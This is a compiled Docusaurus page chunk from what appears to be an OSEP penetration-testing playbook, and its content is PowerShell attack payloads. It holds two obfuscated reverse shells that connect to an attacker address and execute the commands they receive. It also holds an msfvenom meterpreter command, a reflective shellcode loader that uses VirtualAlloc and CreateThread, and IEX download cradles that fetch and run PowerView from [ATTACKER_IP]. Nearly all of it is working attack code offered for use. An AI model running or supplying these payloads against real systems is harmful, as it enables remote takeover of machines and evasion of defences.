"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[2751],{451(e,n,t){t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"osep/initial-access/Payloads/Powershell","title":"PowerShell","description":"Obfuscated Reverse Shell","source":"@site/docs/osep/initial-access/Payloads/Powershell.md","sourceDirName":"osep/initial-access/Payloads","slug":"/osep/initial-access/Payloads/Powershell","permalink":"/OSEP-Playbook/osep/initial-access/Payloads/Powershell","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"title":"PowerShell","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"C/C++","permalink":"/OSEP-Playbook/osep/initial-access/Payloads/C\u2044C++"},"next":{"title":"WebShells","permalink":"/OSEP-Playbook/osep/initial-access/Payloads/WebShells"}}');var l=t(4848),s=t(8453);const a={title:"PowerShell",sidebar_position:1},o=void 0,i={},c=[{value:"<strong>Obfuscated Reverse Shell</strong>",id:"obfuscated-reverse-shell",level:3},{value:"<strong>Meterpreter Reverse Shell</strong>",id:"meterpreter-reverse-shell",level:3},{value:"<strong>Load Directly Into Memory (Reflective One-Liners)</strong>",id:"load-directly-into-memory-reflective-one-liners",level:3}];function d(e){const n={code:"code",h3:"h3",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.h3,{id:"obfuscated-reverse-shell",children:(0,l.jsx)(n.strong,{children:"Obfuscated Reverse Shell"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"Option 1"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'$amit = New-Object System.Net.Sockets.TCPClient("[ATTACER_IP]",[PORT]);\n$amit = $amit.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $amit.Read($bytes, 0, $bytes.Length)) -ne 0){;\n$bruh = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$dback = (iex ". { $bruh } 2>&1" | Out-String );\n$dback2  = $dback + "[" +$ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(\'.\\\') +"]" + " PS > ";\n$sdata =([text.encoding]::ASCII).GetBytes($dback2);\n$amit.Write($sdata,0,$sdata.Length);\n$amit.Flush()};\n$amit.Close()\n\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"Option 2 - Highly Obfuscated"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"$apple = \"172x16x196x1_8080\" # Your IP address and port\n$apple = $apple -replace 'x', '.'\n\n$banana = $apple.LastIndexOf('_')\n$cherry = $apple.Substring(0, $banana)\n$date = [int]$apple.Substring($banana + 1)\n\ntry {\n    $cherry = New-Object System.Net.Sockets.TcpClient($cherry, $date)\n    $date = $cherry.GetStream()\n    $elderberry = New-Object IO.StreamWriter($date)\n    $elderberry.AutoFlush = $true\n    $fig = New-Object IO.StreamReader($date)\n    $elderberry.WriteLine(\"(c) Microsoft Corporation. All rights reserved.`n`n\")\n    $elderberry.Write((pwd).Path + '> ')\n\n    while ($cherry.Connected) {\n        $grape = $fig.ReadLine()\n        if ($grape) {\n            try {\n                # Display the command after the prompt and execute it\n                $honeydew = Invoke-Expression $grape 2>&1 | Out-String\n                $elderberry.WriteLine($grape)\n                $elderberry.WriteLine($honeydew)\n                $elderberry.Write((pwd).Path + '> ')\n            } catch {\n                $elderberry.WriteLine(\"ERROR: $_\")\n                $elderberry.Write((pwd).Path + '> ')\n            }\n        }\n    }\n} catch {\n    exit\n}\n\n"})}),"\n",(0,l.jsx)(n.h3,{id:"meterpreter-reverse-shell",children:(0,l.jsx)(n.strong,{children:"Meterpreter Reverse Shell"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1\n\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"function getDelegateType {\n    Param (\n        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,\n        [Parameter(Position = 1)] [Type] $delType = [Void]\n    )\n\n    $type = [AppDomain]::CurrentDomain.\n    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),\n    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n      DefineDynamicModule('InMemoryModule', $false).\n      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n      [System.MulticastDelegate])\n\n  $type.\n    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).\n      SetImplementationFlags('Runtime, Managed')\n\n  $type.\n    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).\n      SetImplementationFlags('Runtime, Managed')\n\n    return $type.CreateType()\n}\n\nfunction LookupFunc {\n    Param ($moduleName, $functionName)\n\n    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |\n    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].\n      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $tmp=@()\n    $assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))\n}\n\n$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc\n$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])\n$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)\n$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)\n\n$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)\n\n# Replace with shellcode malicious code\n[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,......\n\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)\n\n$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)\n\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)\n\n"})}),"\n",(0,l.jsx)(n.h3,{id:"load-directly-into-memory-reflective-one-liners",children:(0,l.jsx)(n.strong,{children:"Load Directly Into Memory (Reflective One-Liners)"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"Proxy-aware"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/PowerView.obs.ps1')\n\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"Non-proxy aware"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://[ATTACKER_IP]/PowerView.obs.ps1',$false);$h.send();iex $h.responseText\n\n"})})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(d,{...e})}):d(e)}},8453(e,n,t){t.d(n,{R:()=>a,x:()=>o});var r=t(6540);const l={},s=r.createContext(l);function a(e){const n=r.useContext(s);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:a(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);